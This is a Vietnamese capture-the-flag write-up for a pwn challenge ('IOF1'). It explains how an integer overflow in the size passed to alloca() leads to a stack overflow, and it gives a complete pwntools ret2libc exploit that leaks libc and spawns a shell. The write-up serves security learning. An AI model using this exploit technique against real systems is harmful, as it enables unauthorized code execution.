<details>
<summary>IOF1 </summary>


**1. Tóm tắt đề:**

- Một file `iof1`
- Một file `ld-2.31.so`
- Một file `libc.so.6`
- Một file `source.c`

**2. Ý tưởng :**

- Đầu tiên ta sài `pwninit` để link với libc đề cho
- Tiếp theo ta đọc source.

![](https://i.imgur.com/4DzdGRt.png)

- Đề tạo biến `n` thuộc kiểu `unsigned long int`, sau đó gọi hàm `alloca()` để tạo buffer trên stack kế tiếp gọi hàm `read_str` để ghi vào buffer.
- Kế tiếp ta `checksec` để tìm hướng giải. Nhận thấy NX enable, PIE và Canary đều tắt do đó bài này minh thấy chỉ có giải bằng ret2libc

![](https://i.imgur.com/5O0tnvD.png)

- Để ret2libc thì hướng duy nhất là phải cho phải overflow `buffer` bằng hàm `read_str`. Hướng duy nhất để thực hiện là phải sài int overflow `n*8 ` ở hàm `alloca`
- Ta check thử manpage của alloca coi argument của nó nhận range là bao nhiêu để overflow cho đúng

![](https://i.imgur.com/H2lG0wy.png)

- Nó argument của nó thuộc kiểu `size_t`, ta google tiếp xem size_t là gì thì biết được nó đại khái đại diện cho kiểu dữ liệu lớn nhất mà máy mình chịu được. Vậy `size_t` là 8 byte đối với máy 64 bit (số không dấu)

![](https://i.imgur.com/3Nwi2pH.png)


- Kế tiếp ta tìm range của `unsigned long int ` cũng như range của số 8 byte không dấu, lên document ở đây đọc thì ta được thông tin như sau : 

![](https://i.imgur.com/JZJIo3E.png)

- Để biết chính xác mình viết code test trên máy mình. 

![](https://i.imgur.com/eRRubsM.png)

- Vậy nếu ta nhập n lớn hơn số trên thì sẽ bị overflow. Argument của hàm alloca() chỉ nhận 8 byte do đó nếu ta nhập n sao cho khi nhân 8 mà kết quả lớn hơn 8 byte thì nó chỉ nhận 8 byte cuối. Ta sẽ lợi dụng nó để overflow.
- Giả sử mình muốn kết quả của `n*8` là `0x10000000000000008` (mình chọn số này vì nó là số nhỏ nhất khi bị overflow mà chia hết cho 8, chọn khác cũng được) khi đó bị overflow hàm `alloca` sẽ nhận `0x0000000000000008` vậy ta chia 8 để biết n cần nhập là bao nhiêu. Tính đúng ta được kết quả là `0x2000000000000000` tức là `2305843009213693952`.
- Vậy kế tiếp ta chỉ cần viết script để ret2libc.
```python
from pwn import *

exe = ELF("./iof1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

p = process(exe.path) 
p.sendlineafter(b'> ',b'2305843009213693952')

pop_rdi = 0x00000000004013e3 
payload = b'A'*40 +  p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendlineafter(b'Enter your secret: ',payload) 
leak = p.readline()[:-1]
leak = u64(leak.ljust(8,b'\00'))

libc.address = leak - 492448 
p.sendlineafter(b'> ',b'2305843009213693952')

payload = b'A'*40 + p64(pop_rdi)+ p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']) 
p.sendlineafter(b'Enter your secret: ',payload) 
p.interactive() 
```

- Chạy script trên ta có được shell.

</details>